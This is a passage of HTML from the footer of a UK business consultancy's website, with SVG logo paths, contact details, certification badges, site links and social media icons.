36.9297C149.51 37.0699 150.081 37.133 150.653 37.1225Z" fill="#00476D"/>
                        <path d="M163.238 22.2174H166.062L170.762 35.5205L175.549 22.1543H177.751L182.545 35.5205L187.245 22.2174H190L183.734 38.9173H181.424L176.637 25.842L171.814 38.9173H169.471L163.238 22.2174Z" fill="#00476D"/>
                        <path d="M85.186 47.6144H88.1037C88.458 47.6074 88.8124 47.66 89.1486 47.7651C89.427 47.8493 89.6837 47.9895 89.9042 48.1788C90.1898 48.4452 90.3489 48.8132 90.3453 49.1988V49.2199C90.3489 49.4092 90.3164 49.595 90.2513 49.7702C90.1935 49.9245 90.1103 50.0647 89.9982 50.1909C89.897 50.3066 89.7813 50.4082 89.6511 50.4923C89.5246 50.573 89.3944 50.6431 89.2534 50.6992C89.4523 50.7518 89.6439 50.8219 89.8283 50.913C89.9982 50.9936 90.1537 51.1023 90.2875 51.2285C90.5731 51.4949 90.7285 51.863 90.7213 52.2451V52.2626C90.7322 52.7779 90.4755 53.2616 90.038 53.5526C89.7994 53.7103 89.5318 53.826 89.2498 53.8926C88.9208 53.9732 88.5846 54.0153 88.2447 54.0118H85.1897V47.6144H85.186ZM87.988 50.4573C88.3893 50.4748 88.787 50.3732 89.1269 50.1698C89.4161 49.9806 89.5824 49.6581 89.5608 49.3215V49.3005C89.568 48.999 89.4198 48.7186 89.1667 48.5433C88.834 48.3365 88.44 48.2384 88.0423 48.2629H85.9561V50.4573H87.9844H87.988ZM88.2736 53.3633C88.7075 53.3878 89.1377 53.2827 89.5065 53.0618C89.7994 52.8795 89.9693 52.5606 89.9585 52.224V52.203C89.9693 51.8735 89.7921 51.565 89.4993 51.3967C89.0799 51.1794 88.6027 51.0813 88.1254 51.1163H85.9634V53.3738L88.2773 53.3668L88.2736 53.3633Z" fill="#00ADE4"/>
                        <path d="M95.414 54.1098C95.02 54.1133 94.6259 54.0537 94.2499 53.9311C93.9136 53.8189 93.6063 53.6401 93.346 53.4017C93.0857 53.1563 92.8868 52.8584 92.7639 52.5289C92.6193 52.1468 92.547 51.7401 92.5542 51.33V47.6143H93.3351V51.288C93.2954 51.8699 93.4942 52.4447 93.8919 52.8864C94.3041 53.2755 94.8645 53.4789 95.4357 53.4438C95.9925 53.4718 96.5348 53.279 96.9434 52.911C97.3194 52.5604 97.5074 52.0346 97.5038 51.33V47.6143H98.2775V51.2739C98.2847 51.6946 98.216 52.1117 98.0714 52.5078C97.8292 53.1774 97.2796 53.7032 96.5854 53.9275C96.2094 54.0537 95.8117 54.1133 95.414 54.1098Z" fill="#00ADE4"/>
                        <path d="M102.866 54.1029C102.352 54.1134 101.839 54.0293 101.358 53.8575C100.881 53.6787 100.44 53.4158 100.056 53.0863L100.537 52.557C100.859 52.8374 101.228 53.0688 101.626 53.237C102.027 53.3913 102.453 53.4649 102.884 53.4579C103.281 53.4789 103.672 53.3703 103.997 53.1529C104.261 52.9741 104.417 52.6832 104.413 52.3712V52.3502C104.413 52.2135 104.388 52.0803 104.333 51.9541C104.272 51.8244 104.178 51.7122 104.059 51.628C103.892 51.5124 103.708 51.4247 103.513 51.3651C103.22 51.2705 102.923 51.1934 102.623 51.1373C102.28 51.0707 101.94 50.9795 101.607 50.8674C101.347 50.7797 101.101 50.6535 100.884 50.4923C100.704 50.3556 100.559 50.1803 100.461 49.9805C100.364 49.7632 100.317 49.5318 100.324 49.2934V49.2759C100.324 49.034 100.382 48.7957 100.494 48.5818C100.606 48.368 100.769 48.1787 100.964 48.0315C101.177 47.8702 101.423 47.7475 101.68 47.6669C101.973 47.5758 102.276 47.5302 102.584 47.5337C103.032 47.5267 103.48 47.5933 103.903 47.73C104.297 47.8702 104.666 48.07 104.999 48.3189L104.547 48.8763C104.258 48.6484 103.932 48.4697 103.581 48.347C103.26 48.2383 102.916 48.1822 102.576 48.1822C102.197 48.1612 101.821 48.2663 101.506 48.4802C101.26 48.6484 101.116 48.9219 101.112 49.2128V49.2303C101.112 49.3705 101.137 49.5073 101.192 49.637C101.253 49.7702 101.354 49.8823 101.477 49.9665C101.651 50.0857 101.842 50.1768 102.045 50.2399C102.349 50.3416 102.663 50.4222 102.978 50.4853C103.585 50.5799 104.164 50.8043 104.67 51.1408C105.031 51.4177 105.234 51.8454 105.216 52.2906V52.3116C105.219 52.571 105.158 52.8234 105.039 53.0548C104.923 53.2756 104.76 53.4719 104.558 53.6261C104.337 53.7909 104.088 53.9171 103.82 53.9907C103.509 54.0748 103.187 54.1134 102.866 54.1029Z" fill="#00ADE4"/>
                        <path d="M107.24 47.6143H108.018V54.0082H107.24V47.6143Z" fill="#00ADE4"/>
                        <path d="M110.411 47.6143H111.134L115.466 52.7357V47.6143H116.221V54.0082H115.607L111.17 48.764V54.0082H110.415V47.6143H110.411Z" fill="#00ADE4"/>
                        <path d="M118.557 47.6143H123.524V48.2628H119.33V50.4573H123.08V51.1093H119.33V53.3562H123.571V54.0047H118.557V47.6108V47.6143Z" fill="#00ADE4"/>
                        <path d="M127.892 54.1027C127.379 54.1132 126.865 54.0291 126.384 53.8574C125.907 53.6786 125.466 53.4157 125.083 53.0862L125.564 52.5568C125.885 52.8373 126.254 53.0686 126.652 53.2369C127.053 53.3911 127.48 53.4647 127.91 53.4577C128.308 53.4788 128.698 53.3701 129.024 53.1528C129.288 52.974 129.443 52.683 129.439 52.371V52.35C129.439 52.2133 129.414 52.0801 129.36 51.9539C129.298 51.8242 129.204 51.712 129.085 51.6279C128.919 51.5122 128.734 51.4246 128.539 51.365C128.246 51.2703 127.95 51.1932 127.65 51.1371C127.299 51.0705 126.956 50.9794 126.619 50.8637C126.359 50.7761 126.113 50.6499 125.896 50.4886C125.715 50.3519 125.571 50.1766 125.473 49.9768C125.376 49.7595 125.329 49.5281 125.336 49.2898V49.2722C125.336 49.0304 125.39 48.792 125.506 48.5782C125.618 48.3643 125.781 48.175 125.976 48.0278C126.189 47.8666 126.435 47.7439 126.692 47.6633C126.985 47.5721 127.288 47.5265 127.596 47.53C128.044 47.523 128.492 47.5896 128.915 47.7263C129.309 47.8666 129.678 48.0664 130.011 48.3153L129.559 48.8726C129.269 48.6448 128.944 48.466 128.593 48.3433C128.272 48.2346 127.928 48.1785 127.588 48.1785C127.209 48.1575 126.833 48.2627 126.518 48.4765C126.272 48.6448 126.128 48.9182 126.124 49.2091V49.2267C126.124 49.3669 126.149 49.5036 126.204 49.6333C126.265 49.7665 126.366 49.8787 126.489 49.9628C126.663 50.082 126.854 50.1731 127.057 50.2362C127.361 50.3379 127.675 50.4185 127.99 50.4816C128.597 50.5763 129.175 50.8006 129.682 51.1371C130.043 51.4141 130.246 51.8417 130.228 52.2869V52.3079C130.228 52.5674 130.17 52.8197 130.05 53.0511C129.935 53.2719 129.772 53.4682 129.57 53.6225C129.349 53.7872 129.1 53.9134 128.832 53.9871C128.525 54.0712 128.21 54.1097 127.892 54.1027Z" fill="#00ADE4"/>
                        <path d="M134.449 54.297C133.935 54.3075 133.422 54.2234 132.941 54.0516C132.464 53.8728 132.023 53.6099 131.64 53.2804L132.121 52.7511C132.446 53.0315 132.815 53.2629 133.212 53.4311C133.614 53.5854 134.04 53.659 134.471 53.652C134.868 53.673 135.259 53.5643 135.584 53.347C135.848 53.1682 136.004 52.8773 136.004 52.5653V52.5443C136.004 52.4075 135.978 52.2708 135.924 52.1481C135.863 52.0184 135.769 51.9063 135.649 51.8221C135.483 51.7065 135.299 51.6188 135.103 51.5592C134.81 51.4646 134.514 51.3875 134.214 51.3314C133.867 51.2648 133.527 51.1736 133.194 51.0615C132.934 50.9738 132.692 50.8476 132.471 50.6864C132.29 50.5497 132.142 50.3744 132.045 50.1746C131.951 49.9573 131.904 49.7259 131.907 49.4875V49.47C131.907 49.2281 131.961 48.9897 132.074 48.7759C132.186 48.5621 132.348 48.3728 132.544 48.2256C132.757 48.0643 133.003 47.9416 133.259 47.861C133.552 47.7699 133.856 47.7243 134.163 47.7278C134.612 47.7208 135.06 47.7874 135.483 47.9241C135.877 48.0643 136.246 48.2641 136.578 48.513L136.126 49.0704C135.837 48.8425 135.512 48.6637 135.161 48.5411C134.839 48.4324 134.496 48.3763 134.156 48.3763C133.776 48.3553 133.4 48.4604 133.086 48.6743C132.84 48.8425 132.695 49.1159 132.692 49.4069V49.4244C132.692 49.5646 132.717 49.7014 132.771 49.8311C132.836 49.9643 132.934 50.0764 133.057 50.1606C133.23 50.2797 133.426 50.3709 133.628 50.434C133.932 50.5356 134.243 50.6163 134.557 50.6794C135.165 50.774 135.743 50.9984 136.249 51.3349C136.611 51.6118 136.813 52.0395 136.795 52.4847V52.5057C136.799 52.7651 136.741 53.0175 136.622 53.2489C136.506 53.4697 136.34 53.666 136.137 53.8202C135.917 53.985 135.667 54.1112 135.4 54.1848C135.089 54.2689 134.767 54.3075 134.445 54.297H134.449Z" fill="#00ADE4"/>
                        <path d="M147.123 54.1239C146.624 54.1309 146.128 54.0433 145.666 53.868C145.254 53.7103 144.881 53.4684 144.567 53.1669C144.263 52.869 144.024 52.5114 143.869 52.1188C143.702 51.7087 143.616 51.274 143.616 50.8358V50.8148C143.616 49.9524 143.952 49.1252 144.567 48.5012C144.874 48.1892 145.246 47.9403 145.655 47.7686C146.1 47.5863 146.577 47.4951 147.061 47.4986C147.325 47.4986 147.593 47.5162 147.853 47.5547C148.081 47.5863 148.305 47.6424 148.518 47.7195C148.721 47.7896 148.912 47.8807 149.097 47.9894C149.281 48.0981 149.455 48.2207 149.621 48.3505L149.118 48.9008C148.988 48.7921 148.851 48.694 148.706 48.6028C148.558 48.5117 148.403 48.4381 148.24 48.375C148.063 48.3084 147.878 48.2558 147.69 48.2243C147.473 48.1857 147.249 48.1682 147.029 48.1682C146.32 48.1647 145.64 48.4451 145.156 48.9464C144.921 49.1883 144.737 49.4722 144.614 49.7842C144.483 50.1032 144.415 50.4467 144.418 50.7902V50.8113C144.415 51.1723 144.48 51.5299 144.61 51.8699C144.729 52.1819 144.917 52.4693 145.156 52.7112C145.395 52.9531 145.687 53.1459 146.009 53.2686C146.367 53.4053 146.754 53.4754 147.137 53.4684C147.517 53.4684 147.893 53.4053 148.247 53.2791C148.558 53.1704 148.855 53.0197 149.118 52.8269V51.2354H147.04V50.5869H149.874V53.1354C149.52 53.4228 149.122 53.6577 148.692 53.8259C148.193 54.0258 147.658 54.1239 147.115 54.1169L147.123 54.1239Z" fill="#00ADE4"/>
                        <path d="M152.011 47.6283H154.968C155.351 47.6213 155.735 47.6773 156.1 47.7965C156.404 47.8947 156.686 48.0559 156.921 48.2663C157.09 48.424 157.224 48.6133 157.315 48.8236C157.409 49.048 157.456 49.2863 157.452 49.5247V49.5457C157.456 49.7911 157.409 50.0365 157.315 50.2644C157.224 50.4712 157.094 50.657 156.928 50.8112C156.754 50.9725 156.552 51.1022 156.335 51.1968C156.093 51.2985 155.84 51.3721 155.579 51.4106L157.691 54.0222H156.74L154.755 51.5298H152.792V54.0152H152.018V47.6283H152.011ZM154.899 50.8883C155.138 50.8883 155.377 50.8603 155.608 50.7972C155.811 50.7411 155.999 50.6535 156.169 50.5378C156.324 50.4291 156.451 50.2889 156.537 50.1241C156.628 49.9524 156.675 49.7631 156.671 49.5738V49.5528C156.686 49.1882 156.512 48.8412 156.208 48.6273C155.821 48.3854 155.366 48.2663 154.907 48.2943H152.781V50.8883H154.896H154.899Z" fill="#00ADE4"/>
                        <path d="M162.687 54.1241C162.199 54.1311 161.711 54.04 161.259 53.8577C160.847 53.6929 160.471 53.4475 160.156 53.1391C159.849 52.8411 159.607 52.4836 159.444 52.0909C159.278 51.6913 159.191 51.2672 159.191 50.836V50.815C159.191 50.3838 159.274 49.9526 159.444 49.553C159.607 49.1569 159.853 48.7993 160.16 48.4979C160.478 48.1859 160.854 47.937 161.27 47.7652C162.188 47.4077 163.211 47.4077 164.13 47.7652C164.542 47.93 164.918 48.1754 165.232 48.4839C165.54 48.7853 165.782 49.1394 165.945 49.532C166.111 49.9316 166.198 50.3593 166.198 50.7869V50.808C166.198 51.6738 165.851 52.5081 165.225 53.125C164.907 53.437 164.531 53.6859 164.115 53.8577C163.66 54.04 163.175 54.1311 162.683 54.1241H162.687ZM162.709 53.4581C163.081 53.4581 163.45 53.3915 163.793 53.2512C164.112 53.1215 164.401 52.9322 164.643 52.6904C164.882 52.452 165.07 52.1681 165.196 51.8596C165.334 51.5336 165.402 51.1865 165.399 50.836V50.815C165.399 50.4644 165.334 50.1139 165.196 49.7879C165.07 49.4759 164.878 49.1919 164.632 48.9501C164.119 48.4488 163.417 48.1684 162.687 48.1719C162.315 48.1719 161.946 48.2385 161.602 48.3787C161.284 48.5084 160.995 48.6977 160.756 48.9396C160.518 49.1814 160.33 49.4619 160.2 49.7703C160.066 50.0963 159.997 50.4434 159.997 50.7939V50.815C159.997 51.1655 160.062 51.5161 160.2 51.8421C160.33 52.154 160.521 52.438 160.767 52.6799C161.013 52.9217 161.302 53.1145 161.624 53.2442C161.968 53.388 162.336 53.4616 162.709 53.4581Z" fill="#00ADE4"/>
                        <path d="M170.985 54.1133C170.591 54.1203 170.196 54.0572 169.82 53.9345C169.484 53.8224 169.177 53.6436 168.917 53.4052C168.656 53.1598 168.457 52.8619 168.335 52.5324C168.19 52.1503 168.121 51.7436 168.128 51.3335V47.6248H168.902V51.2844C168.862 51.8663 169.061 52.4412 169.459 52.8829C169.871 53.272 170.431 53.4753 171.003 53.4403C171.56 53.4683 172.102 53.2755 172.51 52.911C172.886 52.5569 173.074 52.0276 173.071 51.3265V47.6248H173.844V51.2844C173.852 51.7051 173.783 52.1222 173.638 52.5183C173.396 53.1879 172.847 53.7137 172.152 53.938C171.776 54.0607 171.382 54.1168 170.985 54.1098V54.1133Z" fill="#00ADE4"/>
                        <path d="M176.079 47.6284H178.649C179.007 47.6249 179.361 47.6704 179.705 47.7686C180.001 47.8527 180.276 47.9894 180.518 48.1717C180.743 48.34 180.92 48.5573 181.039 48.8062C181.162 49.0726 181.223 49.3636 181.22 49.658V49.6755C181.227 49.991 181.155 50.303 181.003 50.5869C180.862 50.8428 180.663 51.0672 180.421 51.239C180.16 51.4212 179.871 51.5545 179.564 51.6351C179.224 51.7262 178.873 51.7683 178.523 51.7683H176.856V54.0258H176.082V47.6319L176.079 47.6284ZM178.555 51.1198C178.816 51.1198 179.076 51.0882 179.329 51.0181C179.546 50.9585 179.748 50.8604 179.929 50.7272C180.262 50.4888 180.457 50.1067 180.446 49.7036V49.6861C180.471 49.2794 180.283 48.8868 179.944 48.6449C179.546 48.3925 179.076 48.2699 178.599 48.2909H176.856V51.1163H178.555V51.1198Z" fill="#00ADE4"/>
                        <path d="M34.0034 28.5237H44.481C45.0884 28.5167 45.6488 28.8287 45.9525 29.337C46.2417 29.8382 46.22 30.4552 45.891 30.9319C45.2222 31.8959 45.1896 33.1509 45.8115 34.1429C46.4659 35.1525 47.6337 35.7379 48.8593 35.6678H49.0112C50.2296 35.7274 51.3865 35.1455 52.0409 34.1429C52.6628 33.1439 52.6303 31.8889 51.9578 30.9214C51.6252 30.4447 51.6035 29.8242 51.9072 29.3265C52.2036 28.8041 52.7749 28.4852 53.3895 28.4992H64.6553C63.7948 13.0963 50.5369 0.76769 34.0034 0V8.27983C35.5038 8.05899 37.0404 8.3254 38.3672 9.03701C40.4751 10.1447 41.7622 12.3006 41.7043 14.6247C41.7622 16.9418 40.4823 19.1011 38.3817 20.2123C37.0512 20.938 35.511 21.2149 33.9998 21.0011V28.5237H34.0034Z" fill="#00476D"/>
                        <path d="M55.7758 31.6295C56.0071 33.0351 55.7179 34.4724 54.9623 35.6923C52.7243 38.9173 48.2122 39.7761 44.8824 37.6027C44.105 37.0944 43.4326 36.4459 42.9119 35.6923C42.1527 34.4724 41.8671 33.0316 42.0984 31.6295H34.0034V40.7751C34.365 40.7155 34.7265 40.6875 35.0917 40.684C38.7722 40.663 41.7731 43.5409 41.7947 47.1095C41.8164 50.678 38.8481 53.5875 35.1676 53.6085C34.7807 53.6085 34.3939 53.5805 34.0143 53.5174V66.4665C51.195 59.7465 63.878 47.5441 64.6336 31.5874L55.7721 31.633L55.7758 31.6295Z" fill="#00ADE4"/>
                        <path d="M15.6658 24.8921C16.5914 24.8921 17.5061 25.0814 18.3485 25.4495C17.6724 24.808 16.7468 24.4679 15.8032 24.51H15.6658C14.7475 24.4679 13.8509 24.7904 13.182 25.4004C13.9629 25.0639 14.809 24.8921 15.6658 24.8921ZM38.3529 46.9904V46.8466C38.3926 45.6793 37.7491 44.5856 36.6934 44.0283C35.6051 43.4499 34.2819 43.4814 33.2261 44.1089C32.7055 44.4174 32.0511 44.4349 31.5124 44.1545C30.9773 43.8986 30.6375 43.3692 30.6375 42.7873L30.6628 31.6506H22.5099V31.8223C22.5099 33.4313 22.1339 35.149 21.23 36.3268C19.8815 37.9533 17.817 38.8648 15.6658 38.7841C13.4025 38.8402 11.2513 37.8236 9.90276 36.0604C9.07482 34.7985 8.70604 33.3051 8.85428 31.8188V31.6506H0C0.723093 44.4174 9.95338 55.0844 22.5316 58.7791V69.9895C25.283 69.362 27.9982 68.5908 30.6628 67.6829V53.6051H30.6302V51.0637C30.6302 50.4818 30.9665 49.9489 31.5052 49.693C32.0475 49.4161 32.6983 49.4371 33.2189 49.7491C34.271 50.3766 35.5907 50.4011 36.6717 49.8192C37.7382 49.2584 38.3818 48.1612 38.3312 46.9833" fill="#00476D"/>
                        <path d="M38.3531 14.7335V14.5897C38.3928 13.4189 37.7493 12.3287 36.6936 11.7644C35.6089 11.186 34.2857 11.2105 33.2263 11.8345C32.7093 12.1535 32.0549 12.178 31.5126 11.8941C30.9739 11.6347 30.634 11.1053 30.6376 10.5234V0.0246582C24.213 0.329631 18.0233 2.45042 12.8242 6.12061C10.7273 7.32297 8.25068 9.97658 7.2962 11.0878C2.95041 15.9779 0.394272 22.1194 0.0146484 28.5589H11.1756C11.783 28.5484 12.347 28.8604 12.6471 29.3721C12.9508 29.8699 12.9255 30.4939 12.5856 30.9671C11.924 31.9346 11.8915 33.1826 12.5061 34.1781C13.1533 35.1947 14.3247 35.7906 15.5539 35.7275H15.7058C16.9314 35.7801 18.0884 35.1877 18.7355 34.1781C19.361 33.1826 19.3321 31.9241 18.6632 30.9566C18.3198 30.4834 18.2981 29.8594 18.6018 29.3616C18.9018 28.8498 19.4659 28.5343 20.0733 28.5449H30.6774V18.7998C30.6774 18.2179 31.0137 17.685 31.5524 17.4291C32.0911 17.1452 32.7491 17.1697 33.2661 17.4887C34.3218 18.1092 35.6378 18.1337 36.7189 17.5588C37.771 16.991 38.4037 15.8973 38.3531 14.73" fill="#00ADE4"/>
                        </g>
                        <defs>
                        <clipPath id="clip0_937_17599">
                        <rect width="190" height="70" fill="white"/>
                        </clipPath>
                        </defs>
                    </svg>
                    <div class="footer-info">Jigsaw Business Group are experienced business development consultants offering bespoke services to business in several sectors. From supply chain to recruitment, Jigsaw can cover all your business needs to support growth and achieve results.
                    </div>
                    <div class="contact-info">
                        <h3>Contact</h3>
                        <a href="tel:01912286596">0191 228 6596</a>
                        <a href="mailto:info@jigsawbusinessgroup.com">info@jigsawbusinessgroup.com</a>
                    </div>
                        <div class="footer-logos">
                            <a href="https://jigsawbusinessgroup.com/wp-content/uploads/2025/08/Cyber-Essentials-Cert-2025.pdf" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2023/11/cyberessentials_certification-mark.png" alt="Cyber Essentials Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 1524px; --smush-placeholder-aspect-ratio: 1524/1826;"></a>
                            <a href="https://www.sgs.com/en/certified-clients-and-products/certified-client-directory" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2023/11/SGS_ISO_9001_UKAS_2014_TCL_LR-2.jpg.webp" alt="UKAS Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 305px; --smush-placeholder-aspect-ratio: 305/177;"></a>
                            <a href="https://jigsawbusinessgroup.com/wp-content/uploads/2024/03/REC-JBG-2024.pdf" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2023/11/rec-logo-e1442826741405.jpg.webp" alt="REC Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 130px; --smush-placeholder-aspect-ratio: 130/130;"></a>
                            <a href="https://jigsawbusinessgroup.com/wp-content/uploads/2026/01/Jigsaw-waste-license-CBDU460110.pdf" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2023/11/Environment-Agency-Logo-5.jpg.webp" alt="NEAA Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 241px; --smush-placeholder-aspect-ratio: 241/181;"></a>
                            <a href="" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2023/11/CIPS-Logo.png" alt="CIPS Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 119px; --smush-placeholder-aspect-ratio: 119/60;"></a>
                            <a href="" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2023/11/RISQS-Logo.png" alt="RISQS Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 180px; --smush-placeholder-aspect-ratio: 180/81;"></a>
                            <a href="" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2024/03/pmi_logo.png" alt="PMI Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 1200px; --smush-placeholder-aspect-ratio: 1200/630;"></a>
                            <a href="" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2024/03/ASQ-logo.webp" alt="ASQ Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 800px; --smush-placeholder-aspect-ratio: 800/800;"></a>
                            <a href="" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2024/03/napit-logo-2017.webp" alt="NAPIT Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 500px; --smush-placeholder-aspect-ratio: 500/190;"></a>
                            <!-- PayPal Logo --><a href="https://www.paypal.com/uk/webapps/mpp/paypal-popup" title="How PayPal Works" onclick="javascript:window.open('https://www.paypal.com/uk/webapps/mpp/paypal-popup','WIPaypal','toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=yes, width=1060, height=700'); return false;"><img data-src="https://www.paypalobjects.com/webstatic/mktg/logo/bdg_now_accepting_pp_2line_w.png" border="0" alt="Now accepting PayPal" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload"></a><!-- PayPal Logo -->
                            <a href="https://jigsawbusinessgroup.com/wp-content/uploads/2026/01/JBG-ICO-Registration-Certificate-ZA763466-5-1.pdf" target="_blank"><img data-src="https://jigsawbusinessgroup.com/wp-content/uploads/2024/06/ico-logo.png" alt="NAPIT Logo" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class="lazyload" style="--smush-placeholder-width: 293px; --smush-placeholder-aspect-ratio: 293/172;"></a>
                        </div>
                    </div>
                    <div class="footer-col">
                        <div class="map-con">
                            <div id="regions_div" style="width: 900px; height: 500px;"></div>
                        </div>
                        <div class="map-key">
                            <div class="key key-1"><span></span>Offices</div>
                            <div class="key key-2"><span></span>Where we’ve worked</div>
                            <div class="key key-3"><span></span>Yet to visit!</div>
                        </div>
                        <div class="footer-links">
                            <div class="col-1">
                                <h3>International Locations</h3>
                                <a href="https://jigsawbusinessgroup.com/usa">USA</a>
                                <a href="https://jigsawbusinessgroup.com/eu">EU</a>
                                <a href="https://jigsawbusinessgroup.com/asia">Asia</a>
                            </div>
                            <div class="col-2">
                                <h3>Quick Links</h3>
                                <div class="columns">
                                    <div style="width: 50%;">
                                        <a href="https://jigsawbusinessgroup.com/work-with-us">Work For Us</a>
                                        <a href="https://jigsawbusinessgroup.com/terms-conditions/#cookies">Cookie Policy</a>
                                        <a href="https://jigsawbusinessgroup.com/privacy-policy">Privacy Policy</a>
                                        <a href="https://jigsawbusinessgroup.com/blogs">Blog / News</a>
                                        <a href="https://jigsawbusinessgroup.com/contact">Contact Us</a>
                                    </div>
                                    <div style="width: 80%;">
                                        <a href="https://jigsawbusinessgroup.com/terms-conditions">Website T&C’s</a>
                                        <a href="https://jigsawbusinessgroup.com/supplier-terms-conditions">Supplier T&C’s</a>
                                        <a href="https://jigsawbusinessgroup.com/environmental-policy">Environmental Policy</a>
                                        <a href="https://jigsawbusinessgroup.com/health-and-safety-policy">Health & Safety Policy</a>
                                        <a href="https://jigsawbusinessgroup.com/csr-ethical-trading-policy">CSR Ethical Trading policy</a>
                                        <a href="https://jigsawbusinessgroup.com/quality-policy">Quality Policy</a>
                                        <a href="https://jigsawbusinessgroup.com/contact">Complaint Information</a>
                                        <a href="https://jigsawbusinessgroup.com/sitemap_index.xml">Site Map</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="bottom-footer">
                    <div class="soical-links">
                        <h3>Find Us On</h3>
                        <div class="icons">
                            <a href="https://www.facebook.com/JigsawBusinessGroup/" target="_blank" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" fill="none">
  <path d="M22.9166 12.4999C22.9166 6.74992 18.2499 2.08325 12.4999 2.08325C6.74992 2.08325 2.08325 6.74992 2.08325 12.4999C2.08325 17.5416 5.66659 21.7395 10.4166 22.7083V15.6249H8.33325V12.4999H10.4166V9.89575C10.4166 7.88534 12.052 6.24992 14.0624 6.24992H16.6666V9.37492H14.5833C14.0103 9.37492 13.5416 9.84367 13.5416 10.4166V12.4999H16.6666V15.6249H13.5416V22.8645C18.802 22.3437 22.9166 17.9062 22.9166 12.4999Z" fill="#00416A"/>
</svg></a>
                            <a href="https://twitter.com/Jigsaw_Group" target="_blank" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="23" height="20" viewBox="0 0 23 20" fill="none">
  <path d="M17.8259 0H21.1992L13.8293 8.47278L22.5 20H15.7112L10.3945 13.0079L4.30967 20H0.9345L8.81783 10.9372L0.5 0.000921999H7.46117L12.2673 6.39192L17.8259 0ZM16.6425 17.9699H18.5116L6.4455 1.92412H4.43983L16.6425 17.9699Z" fill="#004E89"/>
</svg></a>
                            <a href="https://www.linkedin.com/company/jigsaw-business-group/?trk=biz-companies-cym" target="_blank" aria-label="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25" fill="none">
  <path d="M19 3.125C19.5304 3.125 20.0391 3.34449 20.4142 3.73519C20.7893 4.12589 21 4.6558 21 5.20833V19.7917C21 20.3442 20.7893 20.8741 20.4142 21.2648C20.0391 21.6555 19.5304 21.875 19 21.875H5C4.46957 21.875 3.96086 21.6555 3.58579 21.2648C3.21071 20.8741 3 20.3442 3 19.7917V5.20833C3 4.6558 3.21071 4.12589 3.58579 3.73519C3.96086 3.34449 4.46957 3.125 5 3.125H19ZM18.5 19.2708V13.75C18.5 12.8494 18.1565 11.9856 17.5452 11.3488C16.9338 10.7119 16.1046 10.3542 15.24 10.3542C14.39 10.3542 13.4 10.8958 12.92 11.7083V10.5521H10.13V19.2708H12.92V14.1354C12.92 13.3333 13.54 12.6771 14.31 12.6771C14.6813 12.6771 15.0374 12.8307 15.2999 13.1042C15.5625 13.3777 15.71 13.7486 15.71 14.1354V19.2708H18.5ZM6.88 8.91667C7.32556 8.91667 7.75288 8.73229 8.06794 8.4041C8.383 8.07591 8.56 7.6308 8.56 7.16667C8.56 6.19792 7.81 5.40625 6.88 5.40625C6.43178 5.40625 6.00193 5.59172 5.68499 5.92186C5.36805 6.25201 5.19 6.69978 5.19 7.16667C5.19 8.13542 5.95 8.91667 6.88 8.91667ZM8.27 19.2708V10.5521H5.5V19.2708H8.27Z" fill="#00416A"/>
</svg></a>
                            <a href="https://www.youtube.com/channel/UC07btdBQP_aH7yZvwLE0I1Q" target="_blank" aria-label="Youtube"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" fill="none">
